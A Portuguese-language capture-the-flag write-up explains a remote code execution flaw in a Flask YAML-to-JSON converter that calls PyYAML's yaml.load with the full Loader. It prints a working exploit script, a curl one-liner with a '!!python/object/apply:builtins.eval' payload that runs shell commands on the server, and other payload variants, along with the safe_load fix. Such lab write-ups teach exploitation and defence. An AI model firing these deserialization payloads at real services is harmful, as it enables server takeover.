# YAML Ain't Safe | Fluid Attacks CTF 2026

`web` `yaml-deserialization` `rce` `insecure-loader` `pyyaml`

| | |
|---|---|
| **Plataforma / evento** | Fluid Attacks CTF 2026 (etapa 2, 04/07/2026) |
| **Categoria** | Web |
| **Resolvido em** | 2026-07-04 |

## TL;DR

O conversor "yaml2json" recebe YAML e faz `yaml.load(yaml_input, Loader=yaml.Loader)`. O `yaml.Loader` do PyYAML é o loader completo: ele instancia objetos Python arbitrários durante o parsing. Mando um YAML com a tag `!!python/object/apply:builtins.eval` passando `__import__('os').popen('cat /flag.txt').read()`, o parser executa, e a flag volta dentro do JSON convertido. É RCE direto.

> [!IMPORTANT]
> **Ideia-chave:** `yaml.load` com `Loader=yaml.Loader` (ou `FullLoader` antigo) é desserialização insegura. YAML não é só dado: com o loader cheio, ele chama construtores Python. O seguro é `yaml.safe_load`.

## Enunciado

> yaml2json converter. Paste your YAML, get JSON back.

**Arquivos / instância:** `app.py` (Flask) e um endpoint. Na minha instância o host era `ab63e65a47096f46.chal.ctf.ae`. A rota `POST /convert` recebe `{"yaml_input": "..."}` e devolve `{"result": "<json>"}`.

## Dicas progressivas

<details><summary>Dica 1</summary>Qual função e qual <code>Loader</code> o app usa para parsear o YAML?</details>
<details><summary>Dica 2</summary><code>yaml.load(x, Loader=yaml.Loader)</code> instancia objetos Python. Isso é desserialização insegura.</details>
<details><summary>Dica 3</summary>Use a tag <code>!!python/object/apply:builtins.eval</code> com <code>__import__('os').popen('cat /flag.txt').read()</code>.</details>

## Ambiente

- **Máquina atacante:** Kali Linux, Python 3 (stdlib `urllib`). Dá pra fazer com `curl`.

***INSERIR no terminal: Kali (atacante)

```bash
export TARGET=ab63e65a47096f46.chal.ctf.ae
```

Na minha instância o host era esse. O painel marcava HTTP, mas a instância respondia em HTTPS, então usei `https://`.

## Resolução

### 1. Extração dos arquivos

O `public.zip` (senha `infected`) traz o `app.py`. `unzip` não abre o AES, então `7z`:

***INSERIR no terminal: Kali (atacante)

```bash
unzip -P infected public.zip -d app
```

```text
   skipping: app.py                  unsupported compression method 99
```

**Isso não funcionou** (pule ao replicar): zip AES. Usei o `7z`:

***INSERIR no terminal: Kali (atacante)

```bash
7z x -pinfected public.zip -oapp && sed -n '1,220p' app/app.py
```

Lendo o `app.py` aparecem duas rotas, `/health` e `/convert`, e é na `/convert` que está o bug.

### 2. Revisão do código: o loader errado

#### `app.py`

```python
@app.route("/convert", methods=["POST"])
def convert():
    data = request.get_json()
    yaml_input = data["yaml_input"]
    parsed = yaml.load(yaml_input, Loader=yaml.Loader)   # <-- loader completo = RCE
    json_output = json.dumps(parsed, indent=2, default=str)
    return jsonify({"result": json_output})
```

O `yaml.Loader` resolve tags como `!!python/object/apply`, `!!python/object/new`, etc. Essas tags dizem ao PyYAML para chamar funções/construtores Python com argumentos do próprio YAML. Ou seja, o "dado" YAML vira código.

> [!TIP]
> **Conceito: desserialização insegura de YAML (PyYAML).** `yaml.load` sem um loader seguro executa construtores durante o parse. A tag `!!python/object/apply:builtins.eval ["expr"]` chama `eval("expr")`. A correção é `yaml.safe_load`, que só entende tipos básicos (dict, list, str, int...). Referência: [PyYAML: loading safely](https://pyyaml.org/wiki/PyYAMLDocumentation#loading-yaml).

### 3. Exploração

Minha primeira tentativa foi sobre `http://` (que o painel anunciava) e deu timeout:

***INSERIR no terminal: Kali (atacante)

```bash
python3 scripts/script2.py
```

```text
[*] Enviando payload para http://ab63e65a47096f46.chal.ctf.ae/convert
[-] Erro na conexão: <urlopen error timed out>
```

**Isso não funcionou** (pule ao replicar): HTTP está morto. Confirmei com um probe nos dois esquemas no `/health`:

***INSERIR no terminal: Kali (atacante)

```bash
echo "== HTTP =="; curl -i -s --max-time 8 "http://$TARGET/health"; echo "== HTTPS =="; curl -k -i -s --max-time 8 "https://$TARGET/health"
```

```text
== HTTP ==
(timeout)
== HTTPS ==
HTTP/1.1 200 OK
```

HTTPS vivo. Ajustei o script para `https://` e segui. O payload YAML aplica `builtins.eval` numa expressão que importa `os`, roda `cat /flag.txt` e retorna a saída. O resultado vem no campo `result` do JSON. Script completo, idêntico ao arquivo em `scripts/`:

#### `scripts/script2.py`

```python
#!/usr/bin/env python3
import json
import re
import ssl
import urllib.request
import urllib.error

# Alvo confirmado via curl:
# HTTPS responde 200 OK em /health.
TARGET = "ab63e65a47096f46.chal.ctf.ae"
URL = f"https://{TARGET}/convert"

# Contexto SSL sem validação estrita de certificado.
# Equivalente ao curl -k.
ssl_context = ssl._create_unverified_context()

# Payload YAML para explorar yaml.load(..., Loader=yaml.Loader).
#
# A tag !!python/object/apply permite chamar funções Python durante o parsing.
# Chamamos builtins.eval e passamos uma expressão Python.
# A expressão importa os, executa "cat /flag.txt" no sistema e retorna o conteúdo.
payload = """!!python/object/apply:builtins.eval
- "__import__('os').popen('cat /flag.txt').read()"
"""

# A rota /convert espera JSON com o campo yaml_input.
body = json.dumps({
    "yaml_input": payload
}).encode()

headers = {
    "Content-Type": "application/json",
    "User-Agent": "yaml-ctf-client/2.0"
}

print(f"[*] Enviando payload para {URL}")
print()
print("=" * 80)
print("PAYLOAD YAML")
print("=" * 80)
print(payload)

req = urllib.request.Request(
    URL,
    data=body,
    headers=headers,
    method="POST"
)

try:
    with urllib.request.urlopen(req, timeout=20, context=ssl_context) as resp:
        status = resp.status
        raw = resp.read().decode(errors="replace")
except urllib.error.HTTPError as e:
    status = e.code
    raw = e.read().decode(errors="replace")
except Exception as e:
    print(f"[-] Erro na conexão: {e}")
    raise SystemExit(1)

print()
print("=" * 80)
print("RESPOSTA HTTP")
print("=" * 80)
print(f"Status: {status}")
print(raw)

# Extração automática da flag dentro da resposta bruta.
match = re.search(r"flag\{[^}\r\n]+\}", raw, re.IGNORECASE)

print()
print("=" * 80)
print("RESULTADO")
print("=" * 80)

if match:
    flag = match.group(0)
    print(f"[+] FLAG ENCONTRADA: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")

    print("[+] Flag salva em flag.txt")
    raise SystemExit(0)

print("[-] Flag não encontrada automaticamente.")
print("[*] Verifique a resposta acima para erro de payload ou filtragem.")
raise SystemExit(2)
```

***INSERIR no terminal: Kali (atacante)

```bash
python3 scripts/script2.py
```

```text
Status: 200
{"result":"\"flag{94b71e65cb9XXXXX}\\n\""}
[+] FLAG ENCONTRADA: flag{94b71e65cb9XXXXX}
```

O mesmo em `curl`, se preferir sem script:

***INSERIR no terminal: Kali (atacante)

```bash
curl -sk "https://$TARGET/convert" -H 'Content-Type: application/json' \
  --data-binary $'{"yaml_input": "!!python/object/apply:builtins.eval\\n- \\"__import__(\'os\').popen(\'cat /flag.txt\').read()\\"\\n"}'
```

```text
{"result":"\"flag{94b71e65cb9XXXXX}\\n\""}
```

## Cadeia de ataque

```mermaid
flowchart LR
    A["POST /convert com YAML malicioso"] --> B["yaml.load Loader=yaml.Loader"]
    B --> C["tag !!python/object/apply builtins.eval"]
    C --> D["eval executa os.popen cat /flag.txt"]
    D --> E["flag volta no campo result"]
```

## Por que funciona

A suposição quebrada é que converter YAML para JSON é uma operação inofensiva de dados. Mas o `yaml.Loader` do PyYAML não trata YAML como dado puro: ele resolve tags que instanciam objetos e chamam funções Python. A tag `!!python/object/apply:builtins.eval` é literalmente "execute esta expressão". A primitiva é execução de código arbitrário no servidor, limitada só pelo que o processo pode fazer (aqui, ler `/flag.txt`).

## Remediação

- Trocar `yaml.load(..., Loader=yaml.Loader)` por `yaml.safe_load(...)`.
- Se precisar de tipos customizados, usar `SafeLoader` com construtores explicitamente registrados e revisados.

## Lições e padrões

- **Sinais para reconhecer:** qualquer serviço que parseia YAML do usuário; procure `yaml.load` sem `safe_`. Vale o mesmo raciocínio para `pickle`, `marshal`, `jsonpickle`, `ObjectInputStream` (Java), etc.
- **Da próxima vez eu tentaria primeiro:** mandar um YAML simples válido (baseline), depois a tag `!!python/object/apply:builtins.eval`. Se filtrarem `eval`, uso `os.system`, `subprocess.check_output`, ou `!!python/object/apply:os.popen`.

## Referências

- [PyYAML Documentation: loading safely](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [PayloadsAllTheThings: YAML deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/YAML.md)

## Flag

```text
flag{94b71e65cb9XXXXX}
```
